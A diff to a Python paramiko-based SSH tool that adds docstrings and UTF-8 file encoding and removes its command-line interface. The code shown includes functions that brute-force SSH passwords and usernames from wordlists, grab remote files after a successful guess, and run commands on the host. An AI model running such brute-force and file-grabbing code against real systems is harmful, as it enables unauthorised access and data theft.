@@ -1,9 +1,10 @@
 """
-#TODO import description
+os module provides a portable way of using operating system dependent functionality.
+importing time to be able to sleep the program and wait if needed.
+importing paramiko to handle SSH connections.
 """
 import os
 import time
-import argparse
 import paramiko
 import paramiko.ssh_exception
 
@@ -118,7 +119,7 @@ def ssh_brute_password(ip, username, password_file):
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
     if os.path.exists(password_file):
-        with open(password_file, 'r') as file:
+        with open(password_file, 'r', encoding='UTF-8') as file:
             passwords = file.read().splitlines()
         print(f"Trying to bruteforce password on {ip} as {username}")
 
@@ -154,10 +155,10 @@ def ssh_brute_user_password(ip, username_file, password_file):
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
     try:
-        with open(password_file, 'r') as password_file:
+        with open(password_file, 'r', encoding='UTF-8') as password_file:
             passwords = password_file.read().splitlines()
 
-        with open(username_file, 'r') as user_file:
+        with open(username_file, 'r', encoding='UTF-8') as user_file:
             users = user_file.read().splitlines()
 
         print(f"Trying to bruteforce username and password on {ip}")
@@ -201,7 +202,7 @@ def ssh_brute_grab(ip, username, password_file, local_path, remote_path):
 
     def grab(local_path, remote_path):
         if os.path.exists(remote_path):
-            with open(remote_path, 'r') as path_file:
+            with open(remote_path, 'r', encoding='UTF-8') as path_file:
                 remote_path = path_file.read().splitlines()
 
                 for path in remote_path:
@@ -221,7 +222,7 @@ def ssh_brute_grab(ip, username, password_file, local_path, remote_path):
             print(f"Cannot find {remote_path}")
 
     if os.path.exists(password_file):
-        with open(password_file, 'r') as file:
+        with open(password_file, 'r', encoding='UTF-8') as file:
             passwords = file.read().splitlines()
         print(f"Trying to bruteforce password on {ip} as {username}")
 
@@ -255,13 +256,13 @@ def ssh_brute_grab(ip, username, password_file, local_path, remote_path):
 
 def ssh_commands(ip, user, password, commands):
     """
-    description of func
+    Connect via ssh and then use commans submitted from a file
     """
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
     if os.path.exists(commands):
-        with open(commands, 'r') as file:
+        with open(commands, 'r', encoding='UTF-8') as file:
             commands = file.read().splitlines()
 
             try:
@@ -287,105 +288,3 @@ def ssh_commands(ip, user, password, commands):
                 ssh.close()
     else:
         print(f"Cannot find file {commands}")
-
-def cli():
-    """
-    Function to handle all the argparse options and returning args to main
-    """
-    parser = argparse.ArgumentParser(description="--SSH-Tool--")
-
-    parser.add_argument("ip",help="Enter ip for ssh-connection")
-    parser.add_argument("username",
-                            nargs='?',
-                            help="Enter username for ssh-connection unless -bu is used")
-
-    parser.add_argument("password",
-                            nargs='?',
-                            help="Enter password for ssh-connection unless -b/-bu is used")
-
-    parser.add_argument("-u",
-                            dest="upload",
-                            nargs=2,
-                            metavar=("l_File", "r_Path"),
-                            help="Upload local file/s to remote path")
-
-    parser.add_argument("-a",
-                            dest="all",
-                            action="store_true",
-                            help="If used, targets all files in a dir")
-
-    parser.add_argument("-d",
-                            dest="download",
-                            nargs=2,
-                            metavar=("l_path", "r_path"),
-                            help="Download file/s to local path from remote path")
-
-
-    parser_group = parser.add_mutually_exclusive_group()
-    parser_group.add_argument("-b",
-                            dest="bf_password",
-                            metavar="passwordlist",
-                            help="Bruteforce password, submit passwordlist")
-
-    parser_group.add_argument("-bu",
-                            dest="bf_user_password",
-                            nargs=2,
-                            metavar=("users", "passwords"),
-                            help="Bruteforce username and password, submit user and passwordlists")
-
-    parser_group.add_argument("-bg",
-                            dest="bf_password_grabfiles",
-                            nargs=3,
-                            metavar=("passwords", "l_path", "r_path"),
-                            help="Bruteforce password and download files from a list.txt")
-
-    parser_group.add_argument("-c",
-                            dest="command",
-                            metavar="df -h",
-                            help="To run commands after connection (e.g: 'df -h' whoami)")
-
-    arg = parser.parse_args()
-    return arg
-
-
-if __name__ == "__main__":
-
-    args = cli()
-    ip = args.ip
-    username = args.username
-    pwd = args.password
-
-    if args.download:
-        local_path = args.download[0]
-        remote_path = args.download[1]
-        if args.all:
-            ssh_download(ip, username, pwd, local_path, remote_path, True)
-        else:
-            ssh_download(ip, username, pwd, local_path, remote_path)
-
-    if args.upload:
-        local_path = args.upload[0]
-        remote_path = args.upload[1]
-        if args.all:
-            ssh_upload(ip, username, pwd, local_path, remote_path, True)
-        else:
-            ssh_upload(ip, username, pwd, local_path, remote_path)
-
-    if args.command:
-        commands = args.command
-        ssh_commands(ip, username, pwd, commands)
-
-    if args.bf_password:
-        passwords = args.bf_password
-        ssh_brute_password(ip, username, passwords)
-
-    if args.bf_password_grabfiles:
-        passwords = args.bf_password_grabfiles[0]
-        local_path = args.bf_password_grabfiles[1]
-        remote_path = args.bf_password_grabfiles[2]
-        ssh_brute_grab(ip, username, passwords, local_path, remote_path)
-
-    if args.bf_user_password:
-        usernames = args.bf_user_password[0]
-        passwords = args.bf_user_password[1]
-        ssh_brute_user_password(ip, usernames, passwords)
